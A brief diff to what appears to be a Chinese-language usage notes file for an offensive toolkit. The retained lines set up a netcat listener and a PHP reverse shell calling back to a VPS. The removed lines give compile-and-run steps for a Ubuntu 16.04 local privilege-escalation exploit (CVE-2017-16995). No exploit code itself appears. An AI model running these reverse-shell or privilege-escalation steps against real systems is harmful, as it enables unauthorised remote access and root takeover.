@@ -54,12 +54,4 @@ nc -lvp 1234
 
 php-reverse-shell.py vps地址 1234
 
-# upstream44.c Ubuntu 16.04本地提权漏洞(CVE-2017-16995)
-
-编译执行即可
-
-gcc -o upstream44 upstream44.c
-
-sh upstream44
-
 # Hope you enjoy ^_^
